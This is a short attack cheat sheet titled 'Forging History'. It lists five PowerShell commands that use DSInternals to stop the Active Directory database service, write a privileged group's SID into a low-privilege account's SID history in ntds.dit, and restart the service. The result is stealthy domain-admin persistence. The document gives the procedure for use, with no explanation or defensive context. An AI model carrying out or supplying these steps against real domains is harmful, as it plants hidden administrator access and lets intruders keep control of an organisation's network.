# FORGING HISTORY

## Requirements: Domain Admin privileges or equivalent

## Tools: DSInternals

#### 1) 

    Get-ADUser YOUR_AD_USERNAME -properties sidhistory,memberof

#### 2) 

    Get-ADGroup "Domain Admins"

#### 3) 

    Stop-Service -Name ntds -force

#### 4) 

    Add-ADDBSidHistory -SamAccountName 'LOW-PRIV_AD_ACCOUNT_USERNAME' -SidHistory 'SID_TO_ADD_TO_SID_HISTORY' -DatabasePath C:\Windows\NTDS\ntds.dit

#### 5) 

    Start-Service -Name ntds
